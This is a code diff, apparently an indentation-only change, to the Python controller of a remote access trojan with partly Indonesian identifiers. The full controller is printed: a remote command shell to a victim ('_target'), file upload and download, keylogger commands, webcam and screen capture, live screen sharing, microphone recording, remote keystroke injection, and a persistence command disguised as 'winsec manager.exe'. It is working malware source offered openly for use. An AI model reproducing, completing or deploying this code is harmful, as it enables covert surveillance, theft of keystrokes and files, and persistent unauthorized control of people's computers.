@@ -63,18 +63,18 @@ def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
 
 
 def keystroke():
-     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-          s.bind(('0.0.0.0', 9995))
-          s.listen(1)
-          print('Connect')
-          conn, addr= s.accept()
-          with conn:
-               print('connected {addr}')
-               while True:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(('0.0.0.0', 9995))
+        s.listen(1)
+        print('Connect')
+        conn, addr= s.accept()
+        with conn:
+            print('connected {addr}')
+            while True:
                     command = input('text: ')
                     conn.sendall(command.encode())
                     break
-     print('send')
+    print('send')
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
@@ -82,28 +82,28 @@ RATE = 44100
 CHUNK = 1024
 
 def receive_and_save(WAVE_OUTPUT):
-     frames = []
-     try:
-          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-               s.bind(('0.0.0.0', 9996))
-               s.listen(1)
-               conn, addr = s.accept()
-               with conn:
+    frames = []
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(('0.0.0.0', 9996))
+            s.listen(1)
+            conn, addr = s.accept()
+            with conn:
                     print(f'connect {addr}')
                     while True:
-                         data = conn.recv(CHUNK)
-                         if not data:
-                              break
-                         frames.append(data)
-          print('saving WAV file')
-          with wave.open(WAVE_OUTPUT, 'wb') as wf:
-               wf.setnchannels(CHANNELS)
-               wf.setsampwidth(2)
-               wf.setframerate(RATE)
-               wf.writeframes(b''.join(frames))
-          print(f'{WAVE_OUTPUT}')
-     except socket.error as e:
-          print(f'{e}')
+                        data = conn.recv(CHUNK)
+                        if not data:
+                            break
+                        frames.append(data)
+        print('saving WAV file')
+        with wave.open(WAVE_OUTPUT, 'wb') as wf:
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(2)
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+        print(f'{WAVE_OUTPUT}')
+    except socket.error as e:
+        print(f'{e}')
 
 def screen_record(host="0.0.0.0", port=9999):
     MAX_WIDTH = 960
@@ -193,18 +193,18 @@ def konversi_byte_stream():
         print("Can't access camera")
 
 def upload_file(namafile):
-     bufsize = 65536
-     if not os.path.exists(namafile):
-          _target.sendall(struct.pack("Q", 0))
-          print('file not found')
-          return
-     if os.path.isdir(namafile):
-         _target.sendall(struct.pack("Q", 0))
-         print(f'{namafile} is a directory')
-         return
-     filesize = os.path.getsize(namafile)
-     _target.sendall(struct.pack("Q", filesize))
-     with open(namafile, 'rb') as f:
+    bufsize = 65536
+    if not os.path.exists(namafile):
+        _target.sendall(struct.pack("Q", 0))
+        print('file not found')
+        return
+    if os.path.isdir(namafile):
+        _target.sendall(struct.pack("Q", 0))
+        print(f'{namafile} is a directory')
+        return
+    filesize = os.path.getsize(namafile)
+    _target.sendall(struct.pack("Q", filesize))
+    with open(namafile, 'rb') as f:
         print('uploading')
         while True:
             data = f.read(bufsize)
@@ -214,14 +214,14 @@ def upload_file(namafile):
         print('uploaded')  
 
 def download_file(namafile):
-     bufsize = 65536
-     size_data = _target.recv(8)
-     filesize = struct.unpack("Q", size_data)[0]
-     if filesize == 0:
-          print('file not found')
-          return 
-     recv = 0
-     with open(namafile, 'wb') as file:
+    bufsize = 65536
+    size_data = _target.recv(8)
+    filesize = struct.unpack("Q", size_data)[0]
+    if filesize == 0:
+        print('file not found')
+        return 
+    recv = 0
+    with open(namafile, 'wb') as file:
         print('downloading')
         while recv < filesize:
                 data = _target.recv(bufsize)
@@ -247,114 +247,114 @@ def shellc():
     print("Type 'help' for help")
     while True:
         try:
-          perintah = input('shell> ')
-          data = json.dumps(perintah)
-          _target.send(data.encode())
-          if perintah in('exit','quit'):
-              exit('Exiting')
-          elif perintah == 'clear':
-             os.system('clear')
-          elif perintah[:3] == 'cd ':
-             pass
-          elif perintah[:8] == 'download':
-             download_file(perintah[9:])
-          elif perintah[:6] == 'upload':
-             upload_file(perintah[7:])
-          elif perintah == 'start_log':
-             print('starting keylogger')
-             pass
-          elif perintah == 'baca_log':
-             recv_keylog()
-          elif perintah == 'clear_log':
-             pass  
-          elif perintah == 'stop_log':
-             print('stoping keylogger')
-             pass
-          elif perintah == 'start_cam':
-             konversi_byte_stream()
-          elif perintah ==  'screen_shot':
-             n += 1
-             download_file("ss"+str(n)+".png")
-          elif perintah == 'screen_share':
-              screen_record(host='0.0.0.0', port=9991) 
-          elif perintah == 'help':
-             print("""
-                   
-                      basic command:
-                   ================================
-                   -exit/quit >> exit
-                   
-                   -clear     >> clear terminal
-                   ================================
+            perintah = input('shell> ')
+            data = json.dumps(perintah)
+            _target.send(data.encode())
+            if perintah in('exit','quit'):
+                exit('Exiting')
+            elif perintah == 'clear':
+                os.system('clear')
+            elif perintah[:3] == 'cd ':
+                pass
+            elif perintah[:8] == 'download':
+                download_file(perintah[9:])
+            elif perintah[:6] == 'upload':
+                upload_file(perintah[7:])
+            elif perintah == 'start_log':
+                print('starting keylogger')
+                pass
+            elif perintah == 'baca_log':
+                recv_keylog()
+            elif perintah == 'clear_log':
+                pass  
+            elif perintah == 'stop_log':
+                print('stoping keylogger')
+                pass
+            elif perintah == 'start_cam':
+                konversi_byte_stream()
+            elif perintah ==  'screen_shot':
+                n += 1
+                download_file("ss"+str(n)+".png")
+            elif perintah == 'screen_share':
+                screen_record(host='0.0.0.0', port=9991) 
+            elif perintah == 'help':
+                print("""
+                    
+                        basic command:
+                    ================================
+                    -exit/quit >> exit
+                    
+                    -clear     >> clear terminal
+                    ================================
 
-                      file transfer command:
-                   ================================
-                   -download  >> download file
+                        file transfer command:
+                    ================================
+                    -download  >> download file
 
-                   -upload    >> upload file
-                   ================================
+                    -upload    >> upload file
+                    ================================
 
-                      keylogging:
-                   ================================
-                   -start_log >> start keylogger
+                        keylogging:
+                    ================================
+                    -start_log >> start keylogger
 
-                   -baca_log  >> read keylogger
+                    -baca_log  >> read keylogger
 
-                   -clear_log >> delet log from keylogger
+                    -clear_log >> delet log from keylogger
 
-                   -stop_log  >> stop keylogger
-                   ================================
+                    -stop_log  >> stop keylogger
+                    ================================
 
-                     camera command:
-                   ================================                   
-                   -start_cam >> access camera
+                        camera command:
+                    ================================                   
+                    -start_cam >> access camera
 
-                   -snap_cam  >> snap camera
-                   ================================
+                    -snap_cam  >> snap camera
+                    ================================
 
-                     screen command:
-                   ================================
-                   -screen_shot >> screen shot
+                        screen command:
+                    ================================
+                    -screen_shot >> screen shot
 
-                   -screen_share >> screen sharing
-                   ================================
+                    -screen_share >> screen sharing
+                    ================================
 
-                     maintain access:
-                   ================================ 
-                   -persistence >> run persistence
-                   example:    persistence winsec manager.exe
-                   =================================
+                        maintain access:
+                    ================================ 
+                    -persistence >> run persistence
+                    example:    persistence winsec manager.exe
+                    =================================
 
-                     mic, keys command:
-                   ================================
-                   -rec_audio >> record audio for 20 second
-                   
-                   -send_key  >> type keyboard remotely
-                   ================================ 
+                        mic, keys command:
+                    ================================
+                    -rec_audio >> record audio for 20 second
+                    
+                    -send_key  >> type keyboard remotely
+                    ================================ 
 
-                     execution:
-                   ================================
-                   -execute    >> start program
+                        execution:
+                    ================================
+                    -execute    >> start program
 
-                   -kill       >> kill program
-                   ================================
-                   
-                   """)
-          elif perintah == 'rec_audio':
-             p += 1
-             receive_and_save('retrieved_audio'+str(p)+'.wav')
-          elif perintah == 'send_key':
-             keystroke()   
-          elif perintah == 'snap_cam':
-             x += 1
-             start_image_server(save_as='webcam'+str(x)+'.jpg') 
-          elif perintah[:7] == 'execute':
-             pass  
-          elif perintah[:4] == 'kill':
-             pass  
-          else:
-             hasil = data_diterima()
-             print(hasil)
+                    -kill       >> kill program
+                    ================================
+                    
+                    """)
+            elif perintah == 'rec_audio':
+                p += 1
+                receive_and_save('retrieved_audio'+str(p)+'.wav')
+            elif perintah == 'send_key':
+                keystroke()   
+            elif perintah == 'snap_cam':
+                x += 1
+                start_image_server(save_as='webcam'+str(x)+'.jpg') 
+            elif perintah[:7] == 'execute':
+                pass  
+            elif perintah[:4] == 'kill':
+                pass  
+            else:
+                hasil = data_diterima()
+                print(hasil)
         except ConnectionResetError:
             print('Connection closed')
             break  
